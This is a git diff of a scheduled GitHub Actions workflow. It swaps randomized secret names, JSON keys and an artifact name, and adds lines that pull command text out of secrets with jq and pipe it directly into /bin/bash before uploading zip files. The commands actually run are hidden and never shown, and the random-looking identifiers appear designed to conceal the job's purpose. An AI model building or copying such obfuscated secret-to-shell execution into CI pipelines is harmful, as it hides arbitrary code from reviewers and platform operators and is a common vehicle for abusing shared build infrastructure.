@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '58 1,7,13,19 * * *'
+    - cron: '38 2,8,14,20 * * *'
 env:
   CI: true
 jobs:
@@ -15,16 +15,17 @@ jobs:
           fetch-depth: 0
       - name: Start
         env:
-          ug455: ${{ secrets.ug455 }}
+          p70029: ${{ secrets.p70029 }}
         run: |
-          printf '%s' "$ug455" | jq -r .cn44 | /bin/bash
-          printf '%s' "$fp2125" | jq -r .hna79 | /bin/bash
-          printf '%s' "$rhxr7909" | jq -r .k31779 | /bin/bash
-          echo $vuc65390 | jq -r .w720 | /bin/bash
+          printf '%s' "$p70029" | jq -r .eqze222 | /bin/bash
+          printf '%s' "$dcnp94590" | jq -r .j4415 | /bin/bash
+          printf '%s' "$ucv555" | jq -r .htkik342 | /bin/bash
+          echo $rsbw785 | jq -r .d19479 | /bin/bash
+          printf '%s' "$ayr0" | jq -r .slc73836 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: t359RBGf
+          name: AoL9dDvf
           path: "*.zip"
           retention-days: 1
